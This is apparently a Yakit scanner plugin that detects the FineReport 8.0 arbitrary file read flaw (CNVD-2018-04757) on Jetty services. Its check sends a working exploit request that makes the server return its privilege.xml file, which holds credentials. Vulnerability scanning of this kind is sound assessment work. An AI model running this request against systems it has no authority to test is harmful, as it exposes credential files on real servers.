# port scan plugin
yakit.AutoInitYakit()
log.setLevel("info")

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36

`
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

    hand, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
    drsp, derr = str.ParseBytesToHTTPResponse(rsp)
    if derr != nil {
        yakit.Error(string(derr))
        return
    }

    // dump(rsp)
    if len(rsp) > 0 {
        if drsp.StatusCode == 200 && str.MatchAllOfSubString(body, `CDATA`) {
            yakit.Info("%v FineReport 8.0 任意文件读取漏洞(CNVD-2018-04757)", addr)
            risk.NewRisk(
                addr,risk.title("FineReport 8.0 任意文件读取漏洞(CNVD-2018-04757)"),
                risk.severity("high"),
                risk.titleVerbose("FineReport 8.0 任意文件读取漏洞(CNVD-2018-04757)存在"),
                risk.type("FileRead[FineReport]"),
                risk.payload(addr + `/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml`),
            )
        }
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    // dump(result.GetServiceName())
    // println("-------------------------------")
    // dump(result.GetCPEs())
    // println("-------------------------------")
    // dump(result.GetDomains())
    // println("-------------------------------")
    // dump(result.GetHtmlTitle())
    // println("-------------------------------")
    // dump(result.GetProto())
    // println("-------------------------------")
    // dump(result.Fingerprint.banner)

    if len(result.Fingerprint.HttpFlows)>0{
        if str.MatchAllOfSubString(result.GetServiceName(), "jetty") {
            handleCheck(result.Target,result.Port)
        }
    }
    
}
